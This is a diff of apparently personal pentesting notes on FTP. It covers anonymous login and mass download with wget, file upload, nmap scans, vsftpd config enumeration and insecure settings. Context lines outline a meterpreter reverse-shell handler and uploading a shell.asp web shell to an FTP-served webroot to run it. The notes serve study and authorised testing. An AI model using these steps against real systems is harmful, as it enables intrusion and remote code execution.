@@ -11,12 +11,23 @@ File Transfer Protocol
 - ascii mode converts files to ascii
 - switch between modes with `binary` and `ascii`
 
-### FTP Commands
+
+## FTP Commands
 ```sh
 ftp 10.129.228.195
 -h help
 ```
+#### Download ALL Files at once
+```shell
+wget -m --no-passive ftp://anonymous:anonymous@10.129.14.136
+tree . #shows the directory structure if we do it in that created folder
+```
 
+#### Upload a file
+```shell 
+touch testupload.txt # on attacker
+put testupload.txt #in ftp>
+```
 #### On ftp shell:
 ```sh
 help #hilfe
@@ -31,6 +42,13 @@ put /home/test/test.txt #upload file
 ```sh
 nmap -sV -sC 192.254.1.1 -p21 #default scan find already anonymous login is allowed and read or writeable
 ```
+```shell
+status #show some infos
+debug #show debug info
+trace #show if tracing is on
+ls # list directories
+```
+
 
 #### searchsploit 
 femitter is a ftp server type name
@@ -73,3 +91,25 @@ msfconsole -x "use exploit/multi/handler; set payload windows/meterpreter/revers
 4. Put  the shell.asp in webroot of ftp and try to open in browser.
 5. Than open it in browser to execute the shell.
 
+## vsFTP
+is a very often used FTP server here is the configuration parameters descriped
+- vsFTP:  https://security.appspot.com/vsftpd.html  
+- conf expl: http://vsftpd.beasts.org/vsftpd_conf.html
+
+#### Enumeration
+```sh
+cat /etc/vsftpd.conf | grep -v "#" #show vsftpd config
+cat /etc/ftpusers #show ftp users
+ 
+```
+
+#### Dangerouse Configurations
+```
+Setting	Description
+anonymous_enable=YES	        Allowing anonymous login?
+anon_upload_enable=YES	        Allowing anonymous to upload files?
+anon_mkdir_write_enable=YES	Allowing anonymous to create new directories?
+no_anon_password=YES	        Do not ask anonymous for password?
+anon_root=/home/username/ftp	Directory for anonymous.
+write_enable=YES	        Allow the usage of FTP commands: STOR, DELE, RNFR, RNTO, MKD, RMD, APPE, and SITE?
+```
